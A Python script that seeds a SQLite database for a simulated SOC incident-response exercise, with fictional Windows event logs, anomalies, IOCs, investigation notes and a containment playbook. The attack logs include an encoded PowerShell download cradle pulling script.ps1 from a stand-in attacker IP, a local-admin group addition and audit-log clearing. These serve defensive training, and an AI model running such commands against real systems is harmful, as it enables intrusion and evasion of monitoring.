import sqlite3
import os
import json
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'incident_response.db')

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db(force_reseed=False):
    """Initialize database tables and seed sample cybersecurity simulation data."""
    conn = get_db_connection()
    cursor = conn.cursor()

    # Drop existing tables if force reseed requested
    if force_reseed:
        cursor.execute("DROP TABLE IF EXISTS investigation_notes")
        cursor.execute("DROP TABLE IF EXISTS response_actions")
        cursor.execute("DROP TABLE IF EXISTS incidents")
        cursor.execute("DROP TABLE IF EXISTS iocs")
        cursor.execute("DROP TABLE IF EXISTS anomalies")
        cursor.execute("DROP TABLE IF EXISTS logs")
        cursor.execute("DROP TABLE IF EXISTS users")

    # 1. Users table (SOC Analysts / Simulated Directory Users)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        full_name TEXT NOT NULL,
        role TEXT NOT NULL,
        email TEXT NOT NULL,
        status TEXT DEFAULT 'Active'
    )
    """)

    # 2. Logs table (Windows SIEM Simulated Event Logs)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        event_id INTEGER NOT NULL,
        username TEXT NOT NULL,
        source_ip TEXT NOT NULL,
        destination_ip TEXT NOT NULL,
        action TEXT NOT NULL,
        status TEXT NOT NULL,
        process TEXT,
        command_line TEXT,
        severity TEXT NOT NULL,
        raw_log TEXT,
        is_suspicious INTEGER DEFAULT 0,
        anomaly_tag TEXT
    )
    """)

    # 3. Anomalies table (Detected Rule-Based Security Anomalies)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS anomalies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        anomaly_code TEXT UNIQUE NOT NULL,
        title TEXT NOT NULL,
        anomaly_type TEXT NOT NULL,
        severity TEXT NOT NULL,
        source_ip TEXT NOT NULL,
        username TEXT NOT NULL,
        detection_timestamp TEXT NOT NULL,
        description TEXT NOT NULL,
        rule_triggered TEXT NOT NULL,
        recommended_action TEXT NOT NULL,
        status TEXT DEFAULT 'Active'
    )
    """)

    # 4. IOCs table (Indicators of Compromise)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS iocs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ioc_type TEXT NOT NULL,
        ioc_value TEXT NOT NULL,
        detection_reason TEXT NOT NULL,
        severity TEXT NOT NULL,
        status TEXT DEFAULT 'Simulated Active',
        simulated_note TEXT,
        confidence TEXT DEFAULT 'High'
    )
    """)

    # 5. Incidents table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS incidents (
        id TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        summary TEXT NOT NULL,
        attack_type TEXT NOT NULL,
        severity TEXT NOT NULL,
        affected_system TEXT NOT NULL,
        affected_user TEXT NOT NULL,
        source_ip TEXT NOT NULL,
        detection_time TEXT NOT NULL,
        incident_status TEXT DEFAULT 'Under Investigation',
        containment_status TEXT DEFAULT 'Pending',
        eradication_status TEXT DEFAULT 'Pending',
        recovery_status TEXT DEFAULT 'Pending',
        assigned_analyst TEXT DEFAULT 'SOC Analyst Alok',
        created_at TEXT NOT NULL
    )
    """)

    # 6. Investigation Notes table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS investigation_notes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        incident_id TEXT NOT NULL,
        author TEXT NOT NULL,
        timestamp TEXT NOT NULL,
        note_text TEXT NOT NULL,
        note_type TEXT DEFAULT 'Observation',
        FOREIGN KEY (incident_id) REFERENCES incidents (id)
    )
    """)

    # 7. Response & Containment Actions table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS response_actions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        incident_id TEXT NOT NULL,
        phase TEXT NOT NULL,
        action_title TEXT NOT NULL,
        description TEXT NOT NULL,
        target_entity TEXT NOT NULL,
        status TEXT DEFAULT 'Pending',
        executed_at TEXT,
        result_log TEXT,
        FOREIGN KEY (incident_id) REFERENCES incidents (id)
    )
    """)

    conn.commit()

    # Seed data if logs table is empty
    cursor.execute("SELECT COUNT(*) FROM logs")
    if cursor.fetchone()[0] == 0:
        seed_data(conn)

    conn.close()

def seed_data(conn):
    """Seed sample data for simulation."""
    cursor = conn.cursor()

    # Seed Users
    users_data = [
        ('analyst_lead', 'Alok Raj (Tier 2 SOC Lead)', 'Lead Incident Responder', 'analyst@soc.simulated.local', 'Active'),
        ('jdoe', 'John Doe (Finance Dept)', 'Standard User', 'jdoe@finance.simulated.local', 'Compromised'),
        ('alice.smith', 'Alice Smith (HR Admin)', 'Standard User', 'alice@hr.simulated.local', 'Active'),
        ('bob.jones', 'Bob Jones (Engineering)', 'Standard User', 'bob@eng.simulated.local', 'Active'),
        ('admin_sec', 'Security Administrator', 'Domain Admin', 'admin@soc.simulated.local', 'Active')
    ]
    cursor.executemany("INSERT INTO users (username, full_name, role, email, status) VALUES (?, ?, ?, ?, ?)", users_data)

    # Seed 32 Realistic Windows SIEM Event Logs
    logs_data = [
        # Normal morning traffic
        ('2026-08-25 08:30:12', 4624, 'alice.smith', '192.168.10.12', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "alice.smith", "IpAddress": "192.168.10.12", "LogonType": 2, "Status": "0x0"}', 0, None),
        ('2026-08-25 08:32:45', 4688, 'alice.smith', '192.168.10.12', '192.168.10.12', 'Process Creation', 'Success', 'outlook.exe', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'LOW', '{"EventID": 4688, "NewProcessName": "outlook.exe", "ParentProcess": "explorer.exe"}', 0, None),
        ('2026-08-25 08:35:10', 4624, 'bob.jones', '192.168.10.18', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "bob.jones", "IpAddress": "192.168.10.18", "LogonType": 2}', 0, None),
        ('2026-08-25 08:40:02', 4688, 'bob.jones', '192.168.10.18', '192.168.10.18', 'Process Creation', 'Success', 'chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-sandbox', 'LOW', '{"EventID": 4688, "NewProcessName": "chrome.exe", "CommandLine": "chrome.exe"}', 0, None),
        ('2026-08-25 08:45:00', 4624, 'svc_backup', '10.0.0.50', '192.168.10.100', 'Service Logon', 'Success', 'services.exe', 'LogonType: 5 (Service)', 'LOW', '{"EventID": 4624, "TargetUserName": "svc_backup", "IpAddress": "10.0.0.50", "LogonType": 5}', 0, None),
        ('2026-08-25 08:50:22', 4688, 'svc_backup', '10.0.0.50', '192.168.10.100', 'Process Creation', 'Success', 'backup_agent.exe', 'C:\\Program Files\\SimBackup\\backup_agent.exe --schedule=daily', 'LOW', '{"EventID": 4688, "NewProcessName": "backup_agent.exe"}', 0, None),
        ('2026-08-25 09:00:15', 4624, 'carol.white', '192.168.10.22', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "carol.white", "IpAddress": "192.168.10.22"}', 0, None),
        ('2026-08-25 09:15:30', 4688, 'carol.white', '192.168.10.22', '192.168.10.22', 'Process Creation', 'Success', 'excel.exe', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE /e', 'LOW', '{"EventID": 4688, "NewProcessName": "excel.exe"}', 0, None),
        ('2026-08-25 09:30:00', 4624, 'david.miller', '192.168.10.30', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "david.miller", "IpAddress": "192.168.10.30"}', 0, None),

        # Attack Stage 1: Brute Force Attempt (6 repeated 4625 failed logins from 192.168.10.45 targeting jdoe)
        ('2026-08-25 09:41:02', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'MEDIUM', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Unknown user name or bad password", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),
        ('2026-08-25 09:41:18', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'MEDIUM', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Unknown user name or bad password", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),
        ('2026-08-25 09:41:35', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'MEDIUM', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Unknown user name or bad password", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),
        ('2026-08-25 09:41:52', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'MEDIUM', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Unknown user name or bad password", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),
        ('2026-08-25 09:42:09', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'HIGH', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Unknown user name or bad password (Attempt 5)", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),
        ('2026-08-25 09:42:25', 4625, 'jdoe', '192.168.10.45', '192.168.10.105', 'Failed Logon', 'Failure', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | SubStatus: 0xC000006A (Bad Password)', 'HIGH', '{"EventID": 4625, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "FailureReason": "Threshold exceeded: 6 consecutive failed attempts", "Status": "0xC000006D", "SubStatus": "0xC000006A"}', 1, 'BRUTE_FORCE'),

        # Attack Stage 2: Suspicious Successful Login from same IP
        ('2026-08-25 09:43:10', 4624, 'jdoe', '192.168.10.45', '192.168.10.105', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 10 (RemoteInteractive) | TargetWorkstation: WS-FIN-042', 'HIGH', '{"EventID": 4624, "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "LogonType": 10, "TargetServer": "WS-FIN-042", "AuthenticationPackage": "NTLM", "Status": "0x0"}', 1, 'SUSPICIOUS_AUTH'),

        # Attack Stage 3: Initial Process Spawn and Reconnaissance
        ('2026-08-25 09:44:05', 4688, 'jdoe', '192.168.10.45', '192.168.10.105', 'Process Creation', 'Success', 'cmd.exe', 'C:\\Windows\\System32\\cmd.exe', 'MEDIUM', '{"EventID": 4688, "NewProcessName": "cmd.exe", "ParentProcess": "userinit.exe", "SubjectUserName": "jdoe"}', 1, 'SUSPICIOUS_EXEC'),

        # Attack Stage 4: Suspicious PowerShell Encoded Execution
        ('2026-08-25 09:44:45', 4688, 'jdoe', '192.168.10.45', '192.168.10.105', 'Process Creation', 'Success', 'powershell.exe', 'powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4ANAA1AC8AcwBjAHIAaQBwAHQALgBwAHMAMQAiACkA', 'HIGH', '{"EventID": 4688, "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -EncodedCommand SQBFAFgA...", "ParentProcess": "cmd.exe", "SubjectUserName": "jdoe"}', 1, 'SUSPICIOUS_POWERSHELL'),

        # Attack Stage 5: Reconnaissance Commands
        ('2026-08-25 09:45:12', 4688, 'jdoe', '192.168.10.45', '192.168.10.105', 'Process Creation', 'Success', 'whoami.exe', 'C:\\Windows\\System32\\whoami.exe /priv /all', 'MEDIUM', '{"EventID": 4688, "NewProcessName": "whoami.exe", "CommandLine": "whoami.exe /priv /all", "ParentProcess": "powershell.exe", "SubjectUserName": "jdoe"}', 1, 'RECON'),
        ('2026-08-25 09:45:28', 4688, 'jdoe', '192.168.10.45', '192.168.10.105', 'Process Creation', 'Success', 'net.exe', 'C:\\Windows\\System32\\net.exe localgroup administrators', 'MEDIUM', '{"EventID": 4688, "NewProcessName": "net.exe", "CommandLine": "net localgroup administrators", "ParentProcess": "powershell.exe", "SubjectUserName": "jdoe"}', 1, 'RECON'),

        # Attack Stage 6: Privilege Escalation & Privilege Assignment (Event 4672 & Net group add)
        ('2026-08-25 09:45:50', 4672, 'jdoe', '192.168.10.45', '192.168.10.105', 'Special Privileges Assigned', 'Success', 'lsass.exe', 'Privileges: SeDebugPrivilege, SeTakeOwnershipPrivilege, SeSecurityPrivilege, SeShutdownPrivilege', 'CRITICAL', '{"EventID": 4672, "SubjectUserName": "jdoe", "PrivilegeList": ["SeDebugPrivilege", "SeTakeOwnershipPrivilege", "SeSecurityPrivilege"], "Status": "Elevated Privileges Granted"}', 1, 'PRIVILEGE_ESCALATION'),
        ('2026-08-25 09:46:15', 4688, 'jdoe', '192.168.10.45', '192.168.10.105', 'Process Creation', 'Success', 'net.exe', 'C:\\Windows\\System32\\net.exe localgroup administrators jdoe /add', 'CRITICAL', '{"EventID": 4688, "NewProcessName": "net.exe", "CommandLine": "net localgroup administrators jdoe /add", "ParentProcess": "cmd.exe", "SubjectUserName": "jdoe"}', 1, 'PRIVILEGE_ESCALATION'),

        # Attack Stage 7: Persistence Installation
        ('2026-08-25 09:47:00', 7045, 'SYSTEM', '192.168.10.45', '192.168.10.105', 'Service Installation', 'Success', 'services.exe', 'ServiceName: SimSecUpdateSvc | ServiceFileName: C:\\Windows\\Temp\\svc_update.exe --service', 'CRITICAL', '{"EventID": 7045, "ServiceName": "SimSecUpdateSvc", "ImagePath": "C:\\\\Windows\\\\Temp\\\\svc_update.exe", "ServiceType": "user mode service", "StartType": "auto start"}', 1, 'PERSISTENCE'),

        # Attack Stage 8: Defense Evasion (Security Log Clear Attempt)
        ('2026-08-25 09:48:30', 1102, 'jdoe', '192.168.10.45', '192.168.10.105', 'Audit Log Cleared', 'Success', 'eventvwr.exe', 'The audit log was cleared by user jdoe (Domain: SIM-CORP)', 'CRITICAL', '{"EventID": 1102, "SubjectUserName": "jdoe", "AuditLog": "Security", "Action": "Clear Audit Log"}', 1, 'DEFENSE_EVASION'),

        # Post-incident & Normal baseline logs
        ('2026-08-25 09:50:00', 4624, 'admin_sec', '10.0.0.10', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive) | SOC Admin Session', 'LOW', '{"EventID": 4624, "TargetUserName": "admin_sec", "IpAddress": "10.0.0.10"}', 0, None),
        ('2026-08-25 09:52:10', 4688, 'SYSTEM', '127.0.0.1', '127.0.0.1', 'Process Creation', 'Success', 'spoolsv.exe', 'C:\\Windows\\System32\\spoolsv.exe', 'LOW', '{"EventID": 4688, "NewProcessName": "spoolsv.exe"}', 0, None),
        ('2026-08-25 09:55:00', 4624, 'hr_user01', '192.168.10.60', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "hr_user01", "IpAddress": "192.168.10.60"}', 0, None),
        ('2026-08-25 10:00:00', 4634, 'alice.smith', '192.168.10.12', '192.168.10.1', 'User Logoff', 'Success', 'lsass.exe', 'LogoffType: 2', 'LOW', '{"EventID": 4634, "TargetUserName": "alice.smith"}', 0, None),
        ('2026-08-25 10:05:22', 4688, 'bob.jones', '192.168.10.18', '192.168.10.18', 'Process Creation', 'Success', 'notepad.exe', 'C:\\Windows\\System32\\notepad.exe C:\\Docs\\notes.txt', 'LOW', '{"EventID": 4688, "NewProcessName": "notepad.exe"}', 0, None),
        ('2026-08-25 10:10:00', 4624, 'eva.green', '192.168.10.75', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "eva.green", "IpAddress": "192.168.10.75"}', 0, None),
        ('2026-08-25 10:15:40', 4688, 'eva.green', '192.168.10.75', '192.168.10.75', 'Process Creation', 'Success', 'calc.exe', 'C:\\Windows\\System32\\calc.exe', 'LOW', '{"EventID": 4688, "NewProcessName": "calc.exe"}', 0, None),
        ('2026-08-25 10:20:00', 4625, 'typo_user', '192.168.10.80', '192.168.10.1', 'Failed Logon', 'Failure', 'lsass.exe', 'Single isolated login failure (user mistyped password once)', 'LOW', '{"EventID": 4625, "TargetUserName": "typo_user", "IpAddress": "192.168.10.80"}', 0, None),
        ('2026-08-25 10:20:30', 4624, 'typo_user', '192.168.10.80', '192.168.10.1', 'User Logon', 'Success', 'lsass.exe', 'LogonType: 2 (Interactive)', 'LOW', '{"EventID": 4624, "TargetUserName": "typo_user", "IpAddress": "192.168.10.80"}', 0, None)
    ]

    cursor.executemany("""
    INSERT INTO logs (timestamp, event_id, username, source_ip, destination_ip, action, status, process, command_line, severity, raw_log, is_suspicious, anomaly_tag)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, logs_data)

    # Seed Detected Anomalies
    anomalies_data = [
        (
            'ANOMALY-001',
            'Possible Brute Force Attack',
            'Brute Force Authentication',
            'HIGH',
            '192.168.10.45',
            'jdoe',
            '2026-08-25 09:42:25',
            'Detected 6 consecutive failed logon attempts (Event ID 4625) within 90 seconds targeting user account "jdoe" from internal subnet IP 192.168.10.45.',
            'Rule 1: [Failed Logins > 5 from same Source IP within short window]',
            'Temporarily block Source IP 192.168.10.45 at the network firewall and verify user account status.',
            'Active'
        ),
        (
            'ANOMALY-002',
            'Suspicious Authentication Activity',
            'Compromised Credential Use',
            'HIGH',
            '192.168.10.45',
            'jdoe',
            '2026-08-25 09:43:10',
            'Successful logon (Event ID 4624, LogonType 10 RemoteInteractive) observed immediately following a burst of 6 failed authentication attempts from the identical source IP.',
            'Rule 2: [Successful Logon (4624) immediately following >= 3 Failed Logons (4625) from same IP]',
            'Force password reset on account "jdoe", terminate active user sessions, and notify the user to verify physical location.',
            'Active'
        ),
        (
            'ANOMALY-003',
            'Suspicious PowerShell Activity',
            'Execution & Defense Evasion',
            'HIGH',
            '192.168.10.45',
            'jdoe',
            '2026-08-25 09:44:45',
            'Execution of powershell.exe with stealth flags (-ExecutionPolicy Bypass, -W Hidden, -EncodedCommand) containing Base64 encoded web cradle payload.',
            'Rule 3: [Process creation powershell.exe containing -enc / -EncodedCommand / Bypass / IEX]',
            'Isolate host WS-FIN-042 (192.168.10.105), terminate running PowerShell process trees, and capture memory for analysis.',
            'Active'
        ),
        (
            'ANOMALY-004',
            'Possible Privilege Escalation',
            'Privilege Escalation & Persistence',
            'CRITICAL',
            '192.168.10.45',
            'jdoe',
            '2026-08-25 09:45:50',
            'Standard domain user "jdoe" was assigned special administrator privileges (Event ID 4672, SeDebugPrivilege) and attempted to add account to local Administrators group.',
            'Rule 4: [Standard User executing privileged command "net localgroup administrators <user> /add" or Event ID 4672]',
            'Revoke elevated privileges, remove account from Administrators group, freeze endpoint for digital forensics.',
            'Active'
        ),
        (
            'ANOMALY-005',
            'Defense Evasion - Security Audit Log Cleared',
            'Defense Evasion',
            'CRITICAL',
            '192.168.10.45',
            'jdoe',
            '2026-08-25 09:48:30',
            'Windows Security Event Log was cleared (Event ID 1102) by user "jdoe" following unauthorized privilege escalation.',
            'Rule 5: [Event ID 1102 (The audit log was cleared) on non-DC system]',
            'Preserve off-host SIEM copies, initiate full incident triage, and isolate endpoint immediately.',
            'Active'
        )
    ]

    cursor.executemany("""
    INSERT INTO anomalies (anomaly_code, title, anomaly_type, severity, source_ip, username, detection_timestamp, description, rule_triggered, recommended_action, status)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, anomalies_data)

    # Seed IOCs (Indicators of Compromise) - Simulated with clear disclaimer
    iocs_data = [
        ('IP Address', '192.168.10.45', 'Attacker workstation conducting automated brute-force and remote interactive session', 'HIGH', 'Simulated Active', 'Simulated private IP for educational demo', 'High (95%)'),
        ('User Account', 'jdoe', 'Compromised Finance domain account used for lateral movement and privilege escalation', 'HIGH', 'Simulated Active', 'Simulated employee identity', 'High (100%)'),
        ('Process / Binary', 'powershell.exe', 'Spawning encoded cradle command: powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -EncodedCommand...', 'HIGH', 'Simulated Active', 'Legitimate Windows tool abused as LOLBIN', 'High (90%)'),
        ('File / Payload Hash (SHA-256)', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'Simulated hash of payload script downloaded from staging server (C:\\Windows\\Temp\\svc_update.exe)', 'CRITICAL', 'Simulated Active', 'Simulated file hash for academic signature matching', 'High (99%)'),
        ('Internal Domain / URL', 'http://192.168.10.45/script.ps1', 'Internal simulated HTTP download cradle hosting reconnaissance script', 'HIGH', 'Simulated Active', 'Simulated staging URL', 'High (90%)'),
        ('Windows Event ID', 'Event ID 4625', 'Multiple repeated failure authentications indicating brute-force dictionary attack', 'MEDIUM', 'Simulated Active', 'Standard Windows Security Log event', 'High (100%)'),
        ('Windows Event ID', 'Event ID 4672', 'Special privileges assigned to non-admin user logon session (SeDebugPrivilege)', 'CRITICAL', 'Simulated Active', 'Standard Windows Security Log event', 'High (100%)'),
        ('Windows Event ID', 'Event ID 1102', 'Audit log cleared attempt to hide post-exploitation tracks', 'CRITICAL', 'Simulated Active', 'Standard Windows Security Log event', 'High (100%)'),
        ('Service Name', 'SimSecUpdateSvc', 'Simulated persistence service registered in HKLM\\SYSTEM\\CurrentControlSet\\Services', 'CRITICAL', 'Simulated Active', 'Simulated registry persistence artifact', 'High (95%)')
    ]

    cursor.executemany("""
    INSERT INTO iocs (ioc_type, ioc_value, detection_reason, severity, status, simulated_note, confidence)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, iocs_data)

    # Seed Primary Incident Record (INC-2026-001)
    incident_record = (
        'INC-2026-001',
        'Suspected Account Compromise and Privilege Escalation',
        'An unauthorized actor from internal host 192.168.10.45 conducted a brute-force authentication attack against standard employee account "jdoe". Following 6 failed logon attempts, a successful RemoteInteractive logon was established. The actor executed an encoded PowerShell payload, conducted host reconnaissance, assigned administrative privileges (SeDebugPrivilege), attempted local group elevation, and attempted to clear Windows Security event logs.',
        'Account Compromise & Privilege Escalation',
        'CRITICAL',
        'WS-FIN-042 (192.168.10.105)',
        'jdoe (Finance Dept)',
        '192.168.10.45 (Unauthorized Subnet Host)',
        '2026-08-25 09:42:25',
        'Under Investigation',
        'In Progress',
        'Pending',
        'Pending',
        'SOC Analyst Alok (Lead)',
        '2026-08-25 09:43:00'
    )

    cursor.execute("""
    INSERT INTO incidents (id, title, summary, attack_type, severity, affected_system, affected_user, source_ip, detection_time, incident_status, containment_status, eradication_status, recovery_status, assigned_analyst, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, incident_record)

    # Seed Investigation Notes
    notes_data = [
        ('INC-2026-001', 'SOC Lead Alok', '2026-08-25 09:43:30', 'SIEM correlation rule SIEM-RULE-04 triggered alert: 6 failed logins followed immediately by successful logon from IP 192.168.10.45 on account jdoe.', 'Initial Triage'),
        ('INC-2026-001', 'SOC Analyst Alok', '2026-08-25 09:46:00', 'Process creation log shows powershell.exe launched with encoded command parameter. Decoded payload reveals an attempt to fetch script.ps1 from 192.168.10.45.', 'Analysis'),
        ('INC-2026-001', 'SOC Analyst Alok', '2026-08-25 09:47:30', 'Critical Event 4672 and 4688 (net localgroup administrators jdoe /add) confirmed privilege escalation attempt. Escalating incident to CRITICAL severity.', 'Escalation'),
        ('INC-2026-001', 'SOC Analyst Alok', '2026-08-25 09:49:00', 'Initiated Containment Phase: Requesting isolation of workstation WS-FIN-042 and firewall rule injection for source IP 192.168.10.45.', 'Containment Action')
    ]

    cursor.executemany("""
    INSERT INTO investigation_notes (incident_id, author, timestamp, note_text, note_type)
    VALUES (?, ?, ?, ?, ?)
    """, notes_data)

    # Seed SANS/NIST 6-Phase Response & Containment Checklist Actions
    response_actions_data = [
        ('INC-2026-001', 'Containment', 'Isolate Affected Workstation', 'Disconnect network interfaces of workstation WS-FIN-042 (192.168.10.105) to prevent lateral movement.', 'WS-FIN-042', 'In Progress', '2026-08-25 09:50:00', 'Simulated Action: Host network adapter set to isolated quarantine VLAN.'),
        ('INC-2026-001', 'Containment', 'Disable Compromised User Account', 'Temporarily disable Active Directory account "jdoe" and revoke all active Kerberos/NTLM tickets.', 'User: jdoe', 'Completed', '2026-08-25 09:51:15', 'Simulated Action: Account "jdoe" status updated to DISABLED in Directory.'),
        ('INC-2026-001', 'Containment', 'Block Suspicious IP in Simulated Firewall', 'Deploy an ingress/egress block rule on perimeter & internal firewalls for source IP 192.168.10.45.', 'IP: 192.168.10.45', 'Completed', '2026-08-25 09:52:00', 'Simulated Action: Firewall ACL Rule #4092 created: DROP ALL from 192.168.10.45.'),
        ('INC-2026-001', 'Containment', 'Terminate Suspicious Process Trees', 'Kill active powershell.exe, cmd.exe, and unauthorized sub-processes on WS-FIN-042.', 'Process: powershell.exe (PID 4892)', 'Completed', '2026-08-25 09:52:45', 'Simulated Action: Taskkill /F /T /PID 4892 executed successfully.'),
        ('INC-2026-001', 'Eradication', 'Remove Unauthorized Local Admin Privilege', 'Remove user "jdoe" from local Administrators group and delete persistence service "SimSecUpdateSvc".', 'Group: Administrators', 'Pending', None, 'Pending analyst review.'),
        ('INC-2026-001', 'Eradication', 'Reset Affected User Credentials', 'Perform password reset for user "jdoe" and enforce Multi-Factor Authentication (MFA).', 'User: jdoe', 'In Progress', '2026-08-25 09:55:00', 'Simulated Action: MFA prompt sent and temporary password generated.'),
        ('INC-2026-001', 'Eradication', 'Preserve Logs & Volatile Forensic Evidence', 'Capture memory dump of WS-FIN-042 and export un-tampered SIEM logs for forensic archival.', 'System: WS-FIN-042', 'Completed', '2026-08-25 09:56:00', 'Simulated Action: Forensic snapshot captured to secure vault.'),
        ('INC-2026-001', 'Recovery', 'Restore Host from Clean Verified Golden Image', 'Re-image affected endpoint WS-FIN-042 with hardened corporate OS baseline and update EDR sensors.', 'System: WS-FIN-042', 'Pending', None, 'Scheduled following forensic sign-off.'),
        ('INC-2026-001', 'Lessons Learned', 'Conduct Post-Incident Review & Update Detection Rules', 'Document incident metrics, review response time, and tighten SIEM threshold for rapid brute-force detection.', 'Organization: SOC Team', 'Pending', None, 'Scheduled within 48 hours post-resolution.')
    ]

    cursor.executemany("""
    INSERT INTO response_actions (incident_id, phase, action_title, description, target_entity, status, executed_at, result_log)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, response_actions_data)

    conn.commit()

if __name__ == '__main__':
    init_db(force_reseed=True)
    print("Database successfully initialized and seeded with 32 realistic logs, 5 anomalies, 9 IOCs, and response playbook.")
